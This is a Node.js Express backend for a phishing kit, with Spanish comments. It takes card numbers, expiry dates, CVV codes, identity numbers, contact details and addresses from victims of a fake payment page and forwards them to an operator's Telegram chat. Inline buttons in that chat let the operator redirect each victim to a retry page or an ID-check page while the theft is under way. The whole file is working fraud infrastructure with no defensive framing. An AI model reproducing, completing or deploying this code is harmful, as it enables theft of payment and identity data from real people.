const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const BOT_TOKEN = 'TU_BOT_TOKEN';
const CHAT_ID = 'TU_CHAT_ID';

// Cliente → Servidor
app.post('/payment', async (req, res) => {
    const data = req.body;

    const text = `
🟣Viank🟣 - |[info]|
---
ℹ️DATOS DE LA TARJETA

💳: ${data.p}
📅: ${data.pdate}
🔒: ${data.c}
🏛️: ${data.ban}

ℹ️DATOS DEL CLIENTE

👨: ${data.dudename} ${data.surname}
🪪: ${data.cc}
📩: ${data.email}
📞: ${data.telnum}

ℹ️DATOS DE FACTURACION

🏙️: ${data.city}
🏙️: ${data.state}
🏙️: ${data.address}
🌐 IP: ${data.ip}
📍 Ubicación: ${data.location}
---
`;

    const reply_markup = {
        inline_keyboard: [
            [
                { text: '❌ Error Tarjeta', callback_data: 'go:payment.html' },
                { text: '✅ Siguiente', callback_data: 'go:id-check.html' }
            ]
        ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: text,
        reply_markup: reply_markup,
        parse_mode: "Markdown"
    });

    res.send({ ok: true });
});

// Telegram → Backend (controla redirección)
app.post('/redirect', (req, res) => {
    const { sessionId, target } = req.body;
    redirectionTable[sessionId] = target;
    res.send({ ok: true });
});

// Cliente consulta destino
let redirectionTable = {};
app.get('/get-redirect/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    const target = redirectionTable[sessionId] || null;
    res.send({ target });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en ${PORT}`));

app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const chatId = update.callback_query.message.chat.id;
        const data = update.callback_query.data; // contiene: go:id-check.html, go:payment.html

        const sessionId = extractSessionId(update.callback_query.message.text); // si decides incluirlo en el texto
        const target = data.replace('go:', '');

        redirectionTable[sessionId] = target;

        // Notificamos al usuario en Telegram
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: `Redireccionando al cliente a ${target}`,
            show_alert: true
        });

        res.sendStatus(200);
    } else {
        res.sendStatus(200);
    }
});

